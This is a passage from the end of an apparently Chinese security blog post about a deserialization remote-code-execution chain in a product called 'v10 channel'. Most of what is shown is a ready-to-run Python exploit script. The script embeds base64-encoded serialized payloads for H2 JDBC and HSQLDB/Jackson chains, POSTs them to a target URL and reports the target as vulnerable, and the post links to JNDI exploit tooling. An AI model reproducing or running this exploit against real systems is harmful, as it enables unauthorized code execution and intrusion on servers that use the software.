class="string">&quot;admin&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">## h2 jdbc attack rce</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">## b = b&quot;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&quot;</span></span><br><span class="line">    <span class="comment">##  hsqldb 打 jackson</span></span><br><span class="line">    b = <span class="string">b&quot;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&quot;</span></span><br><span class="line">    <span class="comment">## b = b&quot;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&quot;</span></span><br><span class="line">    data = base64.b64decode(b)</span><br><span class="line"></span><br><span class="line">    headers[<span class="string">&quot;Content-Length&quot;</span>] = <span class="built_in">str</span>(<span class="built_in">len</span>(data))</span><br><span class="line">    headers[<span class="string">&quot;User-Agent&quot;</span>] = <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>, host, <span class="string">&quot;------存在漏洞！&quot;</span>)</span><br><span class="line">      <span class="comment">## print(&quot;[+]&quot;, res.text)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[o]&quot;</span>, host, <span class="string">&quot;------不存在漏洞！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd(<span class="string">&quot;http://localhost:8075&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/X1r0z/JNDIMap">https://github.com/X1r0z/JNDIMap</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/7wkajk/Frchannel">https://github.com/7wkajk/Frchannel</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ax1sX/SecurityList">https://github.com/ax1sX/SecurityList</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
        
          <li><a href="/links/">links</a></li>
        
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">Hashtable链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.1.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%AE%BE%E7%BD%AEsetter"><span class="toc-number">1.1.2.</span> <span class="toc-text">问题一：为什么要设置setter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88Map%E5%89%8D%E5%90%8Eput%E4%B8%A4%E6%AC%A1"><span class="toc-number">1.1.3.</span> <span class="toc-text">问题二：为什么Map前后put两次</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%89%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AE%BE%E7%BD%AEloadFactor"><span class="toc-number">1.1.4.</span> <span class="toc-text">问题三：为什么设置loadFactor</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap%E9%93%BE"><span class="toc-number">1.2.</span> <span class="toc-text">HashMap链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hsql"><span class="toc-number">2.1.</span> <span class="toc-text">hsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#h2"><span class="toc-number">2.2.</span> <span class="toc-text">h2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E8%84%9A%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">发送脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&text=某v10 channel 反序列化 出网通杀"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&is_video=false&description=某v10 channel 反序列化 出网通杀"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=某v10 channel 反序列化 出网通杀&body=Check out this article: https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
